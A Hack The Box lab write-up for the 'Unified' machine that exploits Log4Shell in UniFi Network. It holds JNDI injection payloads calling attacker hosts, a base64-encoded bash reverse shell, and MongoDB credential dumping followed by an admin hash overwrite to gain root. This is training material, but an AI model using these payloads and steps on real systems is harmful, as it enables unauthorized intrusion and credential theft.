---
layout: writeup
title: Hack The Box Unified
date: 2026-04-18
platform: Hack The Box
category: Hack the Box
difficulty: Very Easy
os: Linux
---

# 🛡 Unified – Penetration Test Report

---

# 🎯 Objective

The objective of this assessment was to identify vulnerabilities in the target system, obtain initial access, perform privilege escalation, and achieve full administrative control over the host.

---

# 🖥 Target Information

- **Target IP:** 10.129.4.149
- **Operating System:** Linux

## Exposed Services

- SSH (22)
- IBM DB2 Admin (6789)
- HTTP (8080 – Apache Tomcat)
- HTTPS (8443 – UniFi Network)

The web application running on port **8443** was identified as:

- **UniFi Network 6.4.54** by Ubiquiti Inc.

---

# 🔎 Enumeration

## Nmap Scan

We begin with the standard approach by performing service and version detection:

```bash
sudo nmap -sV -sC -Pn 10.129.4.149
```

### Open Ports Identified

| Port | Service        | Version        |
|------|----------------|----------------|
| 22   | SSH            | OpenSSH 8.2p1  |
| 6789 | ibm-db2-admin  | Unknown        |
| 8080 | HTTP           | Apache Tomcat  |
| 8443 | HTTPS          | UniFi Network  |

The HTTP service on port **8080** redirects to:

```
https://10.129.4.149:8443/manage
```

Service detection performed. Please report incorrect results at:
https://nmap.org/submit/

Nmap done: 1 IP address (1 host up) scanned in 211.42 seconds.

We begin web enumeration. The service on port 8080 (Tomcat) redirects to port 8443, where we find the UniFi Network login page.

![image.png](/assets/writeups/unified/image.png)

---

## Web Enumeration

Directory brute-forcing:

```bash
gobuster dir -u https://10.129.4.149:8443 -w /usr/share/seclists/Discovery/Web-Content/common.txt -k
```

All discovered endpoints required authentication, so the focus shifted to the login functionality.

The login page revealed:

- **UniFi Network Version 6.4.54**

![image.png](/assets/writeups/unified/image1.png)

---

# 🚨 Identified Vulnerability

## CVE-2021-44228 — Log4Shell

During enumeration, we identified that the target application was running a vulnerable version of Log4j.

The application is affected by **CVE-2021-44228**, known as **Log4Shell**, a critical Remote Code Execution (RCE) vulnerability in the Apache Log4j logging library.

Log4j is a widely used Java-based logging framework embedded in numerous enterprise systems, making this vulnerability extremely impactful.

---

## 🔎 Technical Overview

Log4Shell arises from Log4j’s support for message lookups via JNDI.

Example payload:

```
${jndi:ldap://attacker.com/payload}
```

When processed:

1. Log4j interprets the lookup string  
2. Performs JNDI resolution  
3. Connects to an attacker-controlled LDAP/RMI server  
4. Loads a remote Java class  
5. Executes arbitrary code  

This results in **unauthenticated Remote Code Execution (RCE)**.

---

## ⚠️ Security Impact

- Remote JNDI lookups
- Remote class loading
- Arbitrary command execution
- Full system compromise

---

# 💣 Exploitation

## 🚪 Initial Access

## Intercepting Authentication Requests

Using **Burp Suite**, we intercepted the request to:

```
/api/login
```

![teste.png](/assets/writeups/unified/image-2.png)

The request body was JSON and contained a parameter named `remember`.

This parameter is processed and logged by the backend, making it a suitable injection point.

---

## 🧨 JNDI Injection

Payload used:

```
${jndi:ldap://ATTACKER-IP/test}
```

Injected request:

```json
{
  "username": "admin",
  "password": "admin",
  "remember": "${jndi:ldap://ATTACKER-IP/test}"
}
```

The payload is wrapped in quotes to ensure proper JSON parsing.

---

## 🔎 Understanding the Components

### JNDI

Java Naming and Directory Interface allows applications to locate external resources.

When processing `${jndi:...}`, Log4j initiates an outbound connection.

---

### LDAP

Lightweight Directory Access Protocol is used to deliver malicious Java classes in this exploit.

---

## 🎯 Exploitation Logic

The attack flow:

1. Inject payload into logged input  
2. Trigger Log4j lookup  
3. Force connection to attacker LDAP server  
4. Confirm vulnerability  

Even without RCE, an LDAP callback confirms the injection point.

![write up unified(response burp).png](/assets/writeups/unified/write_up_unified(response_burp).png)

---

## 🔎 Out-of-Band Confirmation

We monitor LDAP traffic:

```bash
sudo tcpdump -i tun0 port 389
```

![image.png](/assets/writeups/unified/image-3.png)

This confirms:

- Input is logged
- Log4j processes payload
- JNDI resolution occurs

---

## 🧨 Rogue JNDI Setup

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

Generated file:

```
target/RogueJndi-1.1.jar
```

![image.png](/assets/writeups/unified/image-4.png)

This acts as a malicious LDAP server.

---

## 🧠 Reverse Shell Payload

Original payload:

```bash
bash -i >& /dev/tcp/IP/PORT 0>&1
```

Encoded:

```bash
echo 'bash -c bash -i >& /dev/tcp/IP/4114 0>&1' | base64
```

Execution chain:

```bash
bash -c {echo,BASE64}|{base64,-d}|{bash,-i}
```

![image.png](/assets/writeups/unified/image-5.png)

---

## 🚀 Launching RogueJNDI

```bash
java -jar target/RogueJndi-1.1.jar \
--command "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" \
--hostname YOUR-IP
```

---

## 🎧 Listener

```bash
nc -lvnp 4114
```

Trigger payload:

```
${jndi:ldap://ATTACKER-IP:1389/o=tomcat}
```

![image.png](/assets/writeups/unified/image-7.png)

Reverse shell received.

---

## 🖥 Shell Stabilization

```bash
script /dev/null -c bash
```

User flag found in:

```
/home/michael
```

![image.png](/assets/writeups/unified/image-8.png)

---

# 🔐 Post-Exploitation

## MongoDB Enumeration

```bash
ps aux | grep mongo
```

MongoDB running on:

```
27117
```

![image.png](/assets/writeups/unified/image-9.png)

---

## Database Access

```bash
mongo --port 27117
```

```bash
use ace
```

![image.png](/assets/writeups/unified/image-10.png)

---

## Credential Dump

```bash
mongo --port 27117 --quiet --eval 'db.admin.find().forEach(printjson)' ace > admin_dump.txt
```

```bash
more admin_dump.txt
```

![image.png](/assets/writeups/unified/image-11.png)

---

## Extracting Credentials

Hash found:

```
$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.
```

- SHA-512 crypt format
- Same as `/etc/shadow`

---

## 🎯 Privilege Escalation Strategy

### Option 1 — Crack Hash

Using tools like John the Ripper.

### Option 2 — Replace Hash (Chosen)

Generate new hash:

```bash
openssl passwd -6 admin123
```

Update database:

```bash
mongo --port 27117 ace --quiet --eval 'db.admin.update({name:"administrator"},{$set:{x_shadow:"NEW_HASH"}})'
```

![image.png](/assets/writeups/unified/image-12.png)
![image.png](/assets/writeups/unified/image-13.png)

---

## 🔓 Administrator Access

Login successful:

![image.png](/assets/writeups/unified/image-14.png)
![image.png](/assets/writeups/unified/image-15.png)

Root credentials found in settings:

![image.png](/assets/writeups/unified/image-16.png)

---

## 👑 Root Access

```bash
ssh root@10.129.1.13
```

![image.png](/assets/writeups/unified/image-17.png)

---

## 🏁 Conclusion

- Log4Shell RCE exploited
- Reverse shell obtained
- MongoDB credentials extracted
- Privilege escalation achieved
- Root access obtained